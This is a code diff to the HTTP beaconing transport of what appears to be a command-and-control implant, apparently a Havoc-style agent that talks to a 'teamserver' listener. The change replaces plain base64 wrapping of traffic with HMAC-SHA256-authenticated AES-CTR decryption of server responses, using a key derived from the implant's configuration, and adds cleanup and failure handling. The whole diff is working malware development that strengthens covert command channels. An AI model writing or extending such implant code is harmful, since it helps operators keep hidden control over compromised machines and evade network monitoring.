@@ -2,6 +2,8 @@
 
 #include <core/TransportHttp.h>
 #include <core/MiniStd.h>
+/* [HVC-029] WireDecode for authenticated + encrypted response processing. */
+#include <crypt/WireEncoder.h>
 
 #ifdef TRANSPORT_HTTP
 
@@ -155,9 +157,6 @@ BOOL HttpSend(
     PVOID   RespBuffer     = { 0 };
     SIZE_T  RespSize       = { 0 };
     BOOL    Successful     = { 0 };
-    /* [HVC-002 2026-03-26] base64-encoded send buffer; freed at LEAVE */
-    PVOID   EncodedBuf     = NULL;
-    SIZE_T  EncodedSize    = 0;
 
     WINHTTP_PROXY_INFO                   ProxyInfo        = { 0 };
     WINHTTP_CURRENT_USER_IE_PROXY_CONFIG ProxyConfig      = { 0 };
@@ -398,14 +397,12 @@ BOOL HttpSend(
         }
     }
 
-    /* [HVC-002 2026-03-26] Base64-encode the packet body before transmission.
-     * The teamserver base64-decodes it before parsing. See TrafficImprovements.md §2. */
-    Base64Encode( (PUCHAR) Send->Buffer, Send->Length, &EncodedBuf, &EncodedSize );
-
-    PRINTF( "TransportSend: WinHttpSendRequest body=%lu bytes (encoded)\n", (unsigned long) EncodedSize )
+    /* [HVC-029] Send->Buffer is already a base64-encoded blob produced by WireEncode
+     * in PackageTransmitAll.  No additional base64 encoding is needed here. */
+    PRINTF( "TransportSend: WinHttpSendRequest body=%lu bytes (base64, from WireEncode)\n", (unsigned long) Send->Length )
 
     /* Send package to our listener */
-    if ( Instance->Win32.WinHttpSendRequest( Request, NULL, 0, EncodedBuf, (DWORD) EncodedSize, (DWORD) EncodedSize, 0 ) ) {
+    if ( Instance->Win32.WinHttpSendRequest( Request, NULL, 0, Send->Buffer, (DWORD) Send->Length, (DWORD) Send->Length, 0 ) ) {
         if ( Instance->Win32.WinHttpReceiveResponse( Request, NULL ) ) {
             /* Is the server recognizing us ? are we good ?  */
             DWORD _statusCode = HttpQueryStatus( Request );
@@ -440,15 +437,34 @@ BOOL HttpSend(
                     MemSet( Buffer, 0, sizeof( Buffer ) );
                 } while ( Successful == TRUE );
 
-                PRINTF( "TransportSend: response body=%lu bytes (base64)\n", (unsigned long) RespSize )
+                PRINTF( "TransportSend: response body=%lu bytes (base64+HMAC, from WireDecode)\n", (unsigned long) RespSize )
 
-                /* [HVC-002 2026-03-26] Decode the base64-encoded response from the
-                 * teamserver before handing it to the packet parser. */
+                /* [HVC-029] Authenticate, decrypt, and decode the teamserver response
+                 * using WireDecode.  Expected format:
+                 *   base64( [IV(16) | AES-CTR(payload) | HMAC-SHA256(32)] )
+                 * WireDecode verifies HMAC (constant-time) before decrypting. */
                 {
+                    UCHAR  RespMacKey[ HMAC_SHA256_SIZE ];
                     PVOID  DecodedBuf  = NULL;
                     SIZE_T DecodedSize = 0;
 
-                    Base64Decode( (PUCHAR) RespBuffer, RespSize, &DecodedBuf, &DecodedSize );
+                    HmacSha256( Instance->Config.AES.Key, 32,
+                                (PUCHAR)"mac", 3,
+                                RespMacKey );
+
+                    if ( ! WireDecode( (PBYTE) RespBuffer, RespSize,
+                                       Instance->Config.AES.Key, RespMacKey,
+                                       (PBYTE*) &DecodedBuf, &DecodedSize ) )
+                    {
+                        PUTS_DONT_SEND( "WireDecode failed (HMAC mismatch or alloc error)" )
+                        MemSet( RespMacKey, 0, sizeof( RespMacKey ) );
+                        MemSet( RespBuffer, 0, RespSize );
+                        Instance->Win32.LocalFree( RespBuffer );
+                        Successful = FALSE;
+                        goto LEAVE;
+                    }
+
+                    MemSet( RespMacKey, 0, sizeof( RespMacKey ) );
                     MemSet( RespBuffer, 0, RespSize );
                     Instance->Win32.LocalFree( RespBuffer );
 
@@ -471,13 +487,6 @@ BOOL HttpSend(
     }
 
 LEAVE:
-    /* [HVC-002 2026-03-26] Free the base64-encoded send buffer (non-NULL when
-     * WinHttpSendRequest was never reached due to an earlier failure). */
-    if ( EncodedBuf ) {
-        MemSet( EncodedBuf, 0, EncodedSize );
-        Instance->Win32.LocalFree( EncodedBuf );
-    }
-
     if ( Connect ) {
         Instance->Win32.WinHttpCloseHandle( Connect );
     }
